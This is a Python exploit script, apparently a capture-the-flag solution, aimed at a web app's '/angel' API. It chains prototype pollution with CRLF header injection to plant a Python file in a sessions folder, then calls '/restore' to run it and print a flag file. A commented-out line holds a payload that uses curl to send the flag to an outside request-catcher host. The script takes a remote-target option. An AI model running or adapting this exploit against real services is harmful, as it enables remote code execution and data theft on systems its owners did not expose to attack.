from requests import Session
import argparse

def exploit(remote):
    URL = "http://localhost:1337"
    if remote is not None:
        URL = remote
    s = Session()
    getAngel = s.get(URL + "/angel")
#    print(getAngel.json())
    angelID = getAngel.json()["id"]
#    print("Angel ID is: {}".format(angelID))
    pythonAngel = s.post(URL + "/angel", json={"angel":{"name":"Vie", "actress":"Vie", "movie":"Vie", "talents": {"0":" '''; #"}}})
    print(pythonAngel.text)
    v = Session()
    proto = v.get(URL + "/angel")
#    print(proto.json())
    #pythonExploit = "import os;os.system('curl v.requestcatcher.com --data \"$(cat flag)\"');'''"
    pythonExploit = "print(open('../../flag').read()[1:]);'''"
    ProtoPolluteAngel = v.post(URL + "/angel", json={"angel":{"name":"Vie", "actress":"Vie", "movie":"Vie", "talents": {"file":"sessions/{}.yaml".format(angelID), "content_type": "text/plain\r\n\r\n{}".format(pythonExploit), "filename": "{}.py".format(angelID)}}})
    print(ProtoPolluteAngel.text)
    triggerRCE = s.get(URL + "/restore")
    print(triggerRCE.text)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-r','--remote', help='Remote URL if you wanted to run exploit against remote.')
    args = parser.parse_args()
    exploit(args.remote)
